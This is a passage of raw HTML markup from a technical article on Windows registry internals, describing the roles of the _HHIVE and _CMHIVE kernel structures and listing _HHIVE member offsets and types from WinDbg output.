 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_3g8lw71b2h2n-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_HHIVE manages the low-level aspects of the hive, including the hive header, bins, and cells, as well as in-memory mappings and synchronization state with its on-disk counterpart (e.g., dirty sectors).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CMHIVE handles more abstract information about the hive, such as the cache of security descriptors, pointers to high-level kernel objects like the root Key Control Block (KCB), and the associated transaction resource manager (_CM_RM structure).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The next subsections will provide a deeper look into the responsibilities and inner workings of these two structures.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;tTszyzmaCA-c12&quot; id=&quot;h.bfvfcqku5ul4&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c16&quot;&gt;_HHIVE structure overview&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The primary role of the _HHIVE structure is to manage the memory-related state of a hive. This allows higher-level registry code to perform operations such as allocating, freeing, and marking cells as &amp;quot;dirty&amp;quot; without needing to handle the low-level implementation details. The _HHIVE structure comprises 49 top-level members, most of which will be described in larger groups below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;GetCellRoutine&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CELL_DATA*&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ReleaseCellRoutine&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x018&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Allocate&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;void*&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x020&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Free&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x028&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FileWrite&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x030&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FileRead&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x038&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HiveLoadFailure&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x040&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;BaseBlock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HBASE_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x048&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FlusherLock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CMSI_RW_LOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x050&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;WriterLock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CMSI_RW_LOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x058&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DirtyVector&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_RTL_BITMAP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x068&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DirtyCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x06c&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DirtyAlloc&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x070&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UnreconciledVector&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_RTL_BITMAP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x080&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UnreconciledCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x084&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;BaseBlockAlloc&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x088&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Cluster&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x08c&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Flat&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x08c&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ReadOnly&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x08c&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Reserved&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;2,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x08d&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DirtyFlag&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x090&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HvBinHeadersUse&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
